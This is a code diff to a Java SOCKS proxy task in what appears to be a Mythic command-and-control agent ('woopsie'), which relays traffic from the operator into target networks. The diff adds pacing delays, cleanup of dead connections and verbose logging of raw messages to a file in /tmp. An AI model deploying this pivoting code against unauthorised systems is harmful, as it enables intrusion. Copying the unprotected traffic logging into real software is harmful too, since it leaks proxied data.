@@ -6,12 +6,17 @@ import com.woopsie.Config;
 
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.FileWriter;
+import java.io.PrintWriter;
+import java.io.IOException;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
 import java.nio.ByteBuffer;
+import java.text.SimpleDateFormat;
 import java.util.Base64;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.concurrent.BlockingQueue;
@@ -46,6 +51,24 @@ public class SocksBackgroundTask implements Runnable {
     private static final int SLEEP_INTERVAL_MS = 1;
     
     private final ConcurrentHashMap<Integer, SocksConnection> connections = new ConcurrentHashMap<>();
+    private static PrintWriter socksLogWriter;
+    private static final SimpleDateFormat timestampFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
+    
+    static {
+        try {
+            socksLogWriter = new PrintWriter(new FileWriter("/tmp/woopsie_socks.log", true), true);
+            socksLog("=== SOCKS logging initialized ===");
+        } catch (IOException e) {
+            System.err.println("Failed to initialize SOCKS log file: " + e.getMessage());
+        }
+    }
+    
+    private static void socksLog(String message) {
+        if (socksLogWriter != null) {
+            socksLogWriter.println("[" + timestampFormat.format(new Date()) + "] " + message);
+            socksLogWriter.flush();
+        }
+    }
     
     public SocksBackgroundTask(BackgroundTask task, Config config) {
         this.task = task;
@@ -54,6 +77,7 @@ public class SocksBackgroundTask implements Runnable {
     
     @Override
     public void run() {
+        socksLog("SOCKS proxy thread started for task " + task.taskId);
         Config.debugLog(config, "[socks] SOCKS proxy thread started");
         
         try {
@@ -65,6 +89,7 @@ public class SocksBackgroundTask implements Runnable {
             response.put("completed", false);
             task.sendResponse(response);
             
+            socksLog("Sent initial listening response");
             Config.debugLog(config, "[socks] Sent initial listening response");
             
             // Main loop - wait for messages from Mythic
@@ -74,6 +99,7 @@ public class SocksBackgroundTask implements Runnable {
                     JsonNode message = task.getToTaskQueue().poll(100, java.util.concurrent.TimeUnit.MILLISECONDS);
                     
                     if (message != null) {
+                        socksLog("Received message from Mythic: " + message.toString());
                         handleMythicMessage(message);
                     }
                     
@@ -135,16 +161,20 @@ public class SocksBackgroundTask implements Runnable {
     
     private void processSocksMessage(JsonNode socksMsgNode) {
         try {
+            socksLog("Processing SOCKS message: " + socksMsgNode.toString());
             Config.debugLog(config, "[socks] Processing SOCKS message: " + socksMsgNode.toString());
             
             boolean exit = socksMsgNode.has("exit") && socksMsgNode.get("exit").asBoolean();
             int serverId = socksMsgNode.get("server_id").asInt();
             String dataB64 = socksMsgNode.has("data") ? socksMsgNode.get("data").asText() : null;
+            int dataLen = dataB64 != null ? Base64.getDecoder().decode(dataB64).length : 0;
             
+            socksLog("server_id=" + serverId + ", exit=" + exit + ", data_len=" + dataLen);
             Config.debugLog(config, "[socks] server_id=" + serverId + ", exit=" + exit + ", has_data=" + (dataB64 != null));
             
             if (exit) {
                 // Close connection
+                socksLog("Closing connection " + serverId);
                 Config.debugLog(config, "[socks] Closing connection " + serverId);
                 SocksConnection conn = connections.remove(serverId);
                 if (conn != null) {
@@ -158,17 +188,29 @@ public class SocksBackgroundTask implements Runnable {
             
             if (conn == null && dataB64 != null) {
                 // New connection
+                socksLog("New connection " + serverId + ", data_len=" + dataLen);
                 byte[] data = Base64.getDecoder().decode(dataB64);
                 handleNewConnection(serverId, data);
             } else if (conn != null && dataB64 != null) {
-                // Existing connection - forward data
+                // Existing connection - check if still alive
+                if (!conn.running) {
+                    socksLog("Connection " + serverId + " is dead, ignoring " + dataLen + " bytes");
+                    // Clean up and notify Mythic
+                    connections.remove(serverId);
+                    sendSocksData(serverId, null, true);
+                    return;
+                }
+                
+                // Forward data
                 byte[] data = Base64.getDecoder().decode(dataB64);
                 
                 if (conn.state == ConnectionState.AWAITING_CONNECT) {
                     // This is the CONNECT request
+                    socksLog("Connection " + serverId + " awaiting CONNECT, data_len=" + dataLen);
                     handleConnect(conn, data);
                 } else if (conn.state == ConnectionState.CONNECTED) {
                     // Forward data to target
+                    socksLog("Forwarding " + dataLen + " bytes to target for connection " + serverId);
                     conn.sendToTarget(data);
                 }
             }
@@ -262,6 +304,9 @@ public class SocksBackgroundTask implements Runnable {
             }
             
             targetSocket.connect(addr, 5000); // 5 second timeout
+            // Disable Nagle's algorithm for better RDP/low-latency protocol performance (matches oopsie)
+            targetSocket.setTcpNoDelay(true);
+            // Don't set buffer sizes - let OS defaults handle it (oopsie doesn't set them either)
             conn.targetSocket = targetSocket;
             conn.state = ConnectionState.CONNECTED;
             
@@ -286,44 +331,33 @@ public class SocksBackgroundTask implements Runnable {
         // Uses approach similar to oopsie: non-blocking socket behavior
         Thread readThread = new Thread(() -> {
             try {
-                // Set a very short timeout to simulate non-blocking behavior
-                conn.targetSocket.setSoTimeout(10); // 10ms timeout similar to non-blocking
+                conn.targetSocket.setSoTimeout(10);
                 InputStream in = conn.targetSocket.getInputStream();
                 byte[] buffer = new byte[BUFFER_SIZE];
                 int packetCount = 0;
                 int sleepCounter = 0;
                 final int SLEEP_THRESHOLD = 10;
-                
                 while (conn.running && !conn.targetSocket.isClosed()) {
                     try {
+                        // Reduced delay before reading
+                        Thread.sleep(5);
+                        long preRead = System.currentTimeMillis();
                         int bytesRead = in.read(buffer);
+                        long postRead = System.currentTimeMillis();
                         if (bytesRead > 0) {
-                            sleepCounter = 0; // Reset sleep counter on successful read
+                            sleepCounter = 0;
                             packetCount++;
-                            
                             byte[] data = new byte[bytesRead];
                             System.arraycopy(buffer, 0, data, 0, bytesRead);
+                            socksLog("[TIMING] Read " + bytesRead + " bytes from target (connection " + conn.serverId + ", packet #" + packetCount + ") at " + preRead + " ms, read took " + (postRead - preRead) + " ms");
                             sendSocksData(conn.serverId, data, false);
-                            
-                            // Adaptive delay based on traffic pattern
-                            // If we're in a burst (packets arriving quickly), minimize delay
-                            // Adaptive delay exactly matching oopsie
-                            long delayMs;
-                            if (packetCount < 50) {
-                                delayMs = 100; // Very slow for handshake and initial commands
-                            } else if (packetCount < 200) {
-                                delayMs = 75; // Still conservative for active usage
-                            } else {
-                                delayMs = 50; // Moderate speed for long-running stable sessions
-                            }
-                            Thread.sleep(delayMs);
+                            Thread.sleep(10); // Increased delay after each read for pacing
                         } else if (bytesRead < 0) {
-                            // Connection closed by target
+                            socksLog("[TIMING] Connection " + conn.serverId + " closed by target at " + System.currentTimeMillis() + " ms");
                             Config.debugLog(config, "[socks] Connection " + conn.serverId + " closed by target");
                             break;
                         }
                     } catch (SocketTimeoutException e) {
-                        // Timeout acts like WouldBlock - no data available yet
                         sleepCounter++;
                         if (sleepCounter >= SLEEP_THRESHOLD) {
                             Thread.sleep(SLEEP_INTERVAL_MS);
@@ -331,7 +365,9 @@ public class SocksBackgroundTask implements Runnable {
                         }
                     }
                 }
+                socksLog("[TIMING] Read thread exiting: running=" + conn.running + ", closed=" + conn.targetSocket.isClosed() + ", exit at " + System.currentTimeMillis() + " ms");
             } catch (Exception e) {
+                socksLog("[TIMING] Read thread exception: " + e.getMessage() + " at " + System.currentTimeMillis() + " ms");
                 Config.debugLog(config, "[socks] Read thread error: " + e.getMessage());
             } finally {
                 sendSocksData(conn.serverId, null, true);
@@ -339,22 +375,37 @@ public class SocksBackgroundTask implements Runnable {
                 conn.close();
             }
         });
-        
+
         // Write thread - writes data from Mythic to target  
         Thread writeThread = new Thread(() -> {
             try {
                 OutputStream out = conn.targetSocket.getOutputStream();
-                
                 while (conn.running && !conn.targetSocket.isClosed()) {
-                    byte[] toSend = conn.outgoingData.poll(10, java.util.concurrent.TimeUnit.MILLISECONDS);
-                    if (toSend != null) {
-                        out.write(toSend);
+                    try {
+                        byte[] buffer = conn.outgoingData.take();
+                        Thread.sleep(50); // pacing before write
+                        out.write(buffer);
                         out.flush();
-                        Config.debugLog(config, "[socks] Wrote " + toSend.length + " bytes to connection " + conn.serverId);
+                        socksLog("[TIMING] Wrote " + buffer.length + " bytes to target (connection " + conn.serverId + ")");
+                        Thread.sleep(50); // pacing after write
+                    } catch (InterruptedException e) {
+                        break;
+                    } catch (java.io.IOException e) {
+                        socksLog("[TIMING] Write failed for connection " + conn.serverId + ": " + e.getMessage() + " at " + System.currentTimeMillis() + " ms - stopping connection");
+                        conn.running = false;
+                        break;
                     }
                 }
+                socksLog("[TIMING] Write thread exiting normally for connection " + conn.serverId + " at " + System.currentTimeMillis() + " ms");
             } catch (Exception e) {
+                socksLog("[TIMING] Write thread exception for connection " + conn.serverId + ": " + e.getMessage() + " at " + System.currentTimeMillis() + " ms");
                 Config.debugLog(config, "[socks] Write thread error: " + e.getMessage());
+            } finally {
+                socksLog("[TIMING] Write thread setting conn.running=false for connection " + conn.serverId + " at " + System.currentTimeMillis() + " ms");
+                conn.running = false;
+                try {
+                    conn.targetSocket.close();
+                } catch (Exception ignored) {}
             }
         });
         
@@ -364,8 +415,11 @@ public class SocksBackgroundTask implements Runnable {
         writeThread.setName("SOCKS-Write-" + conn.serverId);
         
         conn.forwardThread = readThread;
-        readThread.start();
+        
+        // Start write thread first (it blocks waiting for data from Mythic)
         writeThread.start();
+        // Then start read thread (begins reading from target immediately)
+        readThread.start();
     }
     
     private AddrSpec parseSocks5Request(byte[] data) {
@@ -428,10 +482,15 @@ public class SocksBackgroundTask implements Runnable {
             Map<String, Object> response = new HashMap<>();
             response.put("socks", new Map[]{socksMsg});
             
+            socksLog("Sending SOCKS response to Mythic: server_id=" + serverId + ", exit=" + exit + ", data_len=" + (data != null ? data.length : 0));
             Config.debugLog(config, "[socks] Queuing SOCKS response: server_id=" + serverId + ", exit=" + exit + ", data_len=" + (data != null ? data.length : 0));
+            
+            // Use blocking sendResponse to ensure data delivery
+            // The socket timeout will prevent us from reading too fast
             task.sendResponse(response);
             Config.debugLog(config, "[socks] Response queued successfully");
         } catch (Exception e) {
+            socksLog("Error sending SOCKS data: " + e.getMessage());
             Config.debugLog(config, "[socks] Error sending SOCKS data: " + e.getMessage());
             if (config.isDebug()) {
                 e.printStackTrace();
@@ -466,7 +525,9 @@ public class SocksBackgroundTask implements Runnable {
         }
         
         void sendToTarget(byte[] data) {
-            outgoingData.offer(data);
+            if (running && !targetSocket.isClosed()) {
+                outgoingData.offer(data);
+            }
         }
         
         void close() {
